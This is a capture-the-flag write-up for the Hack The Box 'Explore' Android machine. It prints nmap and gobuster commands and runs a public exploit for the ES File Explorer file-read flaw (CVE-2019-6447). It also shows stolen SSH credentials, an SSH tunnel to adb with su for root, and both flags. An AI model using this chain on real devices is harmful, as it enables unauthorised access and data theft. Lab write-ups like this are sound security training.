---
title: Hackthebox - Explore
date: 2021-09-11 
categories: [hackthebox, machines]
tags: []

image:
  src: /path/to/image/file
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: image alternative text
---
# Enumeration


Use nmap to find ports and services running on the target machines


```
nmap -T4 -sC -sV -p- -Pn -oN nmap.log 10.10.10.247
Warning: 10.10.10.247 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.247
Host is up (0.091s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
44115/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:00:45 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 10 Sep 2021 18:00:45 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 10 Sep 2021 18:00:50 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:00:50 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=9/10%Time=613B9CFB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44115-TCP:V=7.91%I=7%D=9/10%Time=613B9CFA%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:10\x20Sep\x202021\x2018:00:45\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2010\x20Sep\x202021\x2018:0
SF:0:45\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2010\x20Sep\x202021\x
SF:2018:00:50\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2010\x20Sep\x202021\x2018:00:50\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2010\x20Sep\x202021\x2018:01:06\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2010\x20Sep\x
SF:202021\x2018:01:06\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x201
SF:0\x20Sep\x202021\x2018:01:06\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2010\x20Sep\x202021\x2018:01:06\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone
```
## User Flag

```
gobuster dir -u http://10.10.10.247:59777 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
Nothing much here!!


After searching around the net for a Minecraft exploit I decided to try searching for ES File Explorer Name Response httpd, After a few miniets searching I found (ES File Explorer 4.1.9.7.4 - Arbitrary File Read) on dbexploit website.

Save the python script and execute the following to list files.


```
python3 ES-File-Explorer-Open-Port-Vulnerability.py listFiles 10.10.10.247


==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : lib
time : 3/25/20 05:12:02 AM
type : folder
size : 12.00 KB (12,288 Bytes)

name : vndservice_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 65.00 Bytes (65 Bytes)

name : vendor_service_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_seapp_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_property_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 392.00 Bytes (392 Bytes)

name : vendor_hwservice_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_file_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 6.92 KB (7,081 Bytes)

name : vendor
time : 3/25/20 12:12:33 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : ueventd.rc
time : 9/10/21 09:10:57 AM
type : file
size : 5.00 KB (5,122 Bytes)

name : ueventd.android_x86_64.rc
time : 9/10/21 09:10:57 AM
type : file
size : 464.00 Bytes (464 Bytes)

name : system
time : 3/25/20 12:12:31 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : sys
time : 9/10/21 09:10:57 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : storage
time : 9/10/21 09:11:03 AM
type : folder
size : 80.00 Bytes (80 Bytes)

name : sepolicy
time : 9/10/21 09:10:57 AM
type : file
size : 357.18 KB (365,756 Bytes)

name : sdcard
time : 4/21/21 02:12:29 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : sbin
time : 9/10/21 09:10:57 AM
type : folder
size : 140.00 Bytes (140 Bytes)

name : product
time : 3/24/20 11:39:17 PM
type : folder
size : 4.00 KB (4,096 Bytes)

name : proc
time : 9/10/21 09:10:56 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : plat_service_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 13.73 KB (14,057 Bytes)

name : plat_seapp_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 1.28 KB (1,315 Bytes)

name : plat_property_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 6.53 KB (6,687 Bytes)

name : plat_hwservice_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 7.04 KB (7,212 Bytes)

name : plat_file_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 23.30 KB (23,863 Bytes)

name : oem
time : 9/10/21 09:10:57 AM
type : folder
size : 40.00 Bytes (40 Bytes)

name : odm
time : 9/10/21 09:10:57 AM
type : folder
size : 220.00 Bytes (220 Bytes)

name : mnt
time : 9/10/21 09:10:58 AM
type : folder
size : 240.00 Bytes (240 Bytes)

name : init.zygote64_32.rc
time : 9/10/21 09:10:57 AM
type : file
size : 875.00 Bytes (875 Bytes)

name : init.zygote32.rc
time : 9/10/21 09:10:57 AM
type : file
size : 511.00 Bytes (511 Bytes)

name : init.usb.rc
time : 9/10/21 09:10:57 AM
type : file
size : 5.51 KB (5,646 Bytes)

name : init.usb.configfs.rc
time : 9/10/21 09:10:57 AM
type : file
size : 7.51 KB (7,690 Bytes)

name : init.superuser.rc
time : 9/10/21 09:10:57 AM
type : file
size : 582.00 Bytes (582 Bytes)

name : init.rc
time : 9/10/21 09:10:57 AM
type : file
size : 29.00 KB (29,697 Bytes)

name : init.environ.rc
time : 9/10/21 09:10:57 AM
type : file
size : 1.04 KB (1,064 Bytes)

name : init.android_x86_64.rc
time : 9/10/21 09:10:57 AM
type : file
size : 3.36 KB (3,439 Bytes)

name : init
time : 9/10/21 09:10:57 AM
type : file
size : 2.29 MB (2,401,264 Bytes)

name : fstab.android_x86_64
time : 9/10/21 09:10:57 AM
type : file
size : 753.00 Bytes (753 Bytes)

name : etc
time : 3/25/20 03:41:52 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : dev
time : 9/10/21 09:11:00 AM
type : folder
size : 2.64 KB (2,700 Bytes)

name : default.prop
time : 9/10/21 09:10:57 AM
type : file
size : 1.09 KB (1,118 Bytes)

name : data
time : 3/15/21 04:49:09 PM
type : folder
size : 4.00 KB (4,096 Bytes)

name : d
time : 9/10/21 09:10:56 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : config
time : 9/10/21 09:10:58 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : charger
time : 12/31/69 07:00:00 PM
type : file
size : 0.00 Bytes (0 Bytes)

name : cache
time : 9/10/21 09:10:58 AM
type : folder
size : 120.00 Bytes (120 Bytes)

name : bugreports
time : 12/31/69 07:00:00 PM
type : file
size : 0.00 Bytes (0 Bytes)

name : bin
time : 3/25/20 12:26:22 AM
type : folder
size : 8.00 KB (8,192 Bytes)

name : acct
time : 9/10/21 09:10:57 AM
type : folder
size : 0.00 Bytes (0 Bytes)
```

After searching around I found storage/emulated/0/DCIM/creds.jpg

Download the jpg
```
wget http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg  
```
![](/assets/walkthroughs/explore/creds.jpg)

Using those credentials ssh into the machine
- user kristi
- pass Kr1sT!5h@Rp3xPl0r3!
```
ssh kristi@10.10.10.247 -p 2222

Password authentication
Password:
:/ $ cd sdcard
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
```
Submit the user flag to hackthebox, Congratulations.

## Root Flag

While we are still connected through SSH, Check listening ports
```
netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp6       0      0 localhost:36217         :::*                    LISTEN     
tcp6       0      0 :::59777                :::*                    LISTEN     
tcp6       0      0 ::ffff:10.10.10.2:35405 :::*                    LISTEN     
tcp6       0      0 :::2222                 :::*                    LISTEN     
tcp6       0      0 :::5555                 :::*                    LISTEN     
tcp6       0      0 :::42135                :::*                    LISTEN   
```
Port 5555 is open, Using ssh tunneling

```
ssh -L 5555:127.0.0.1:5555 -N -f kristi@10.10.10.247 -p 2222
```

Then

```
adb connect 127.0.0.1:5555

```

```
adb shell                 
x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ # ls
acct                   init.superuser.rc       sbin                      
bin                    init.usb.configfs.rc    sdcard                    
bugreports             init.usb.rc             sepolicy                  
cache                  init.zygote32.rc        storage                   
charger                init.zygote64_32.rc     sys                       
config                 lib                     system                    
d                      mnt                     ueventd.android_x86_64.rc
data                   odm                     ueventd.rc                
default.prop           oem                     vendor                    
dev                    plat_file_contexts      vendor_file_contexts      
etc                    plat_hwservice_contexts vendor_hwservice_contexts
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts  
init                   plat_seapp_contexts     vendor_seapp_contexts     
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts   
init.environ.rc        proc                    vndservice_contexts       
init.rc                product                 
:/ # cd data
:/data # ls
adb           bootchart     media       property       tombstones
anr           cache         mediadrm    resource-cache user       
app           dalvik-cache  misc        root.txt       user_de    
app-asec      data          misc_ce     ss             vendor     
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
app-lib       es_starter.sh nfc         system         vendor_de  
app-private   local         ota         system_ce      
backup        lost+found    ota_package system_de      
:/data # cat root.txt
f04fc82b6d49b41c9b08982be59338c5
```
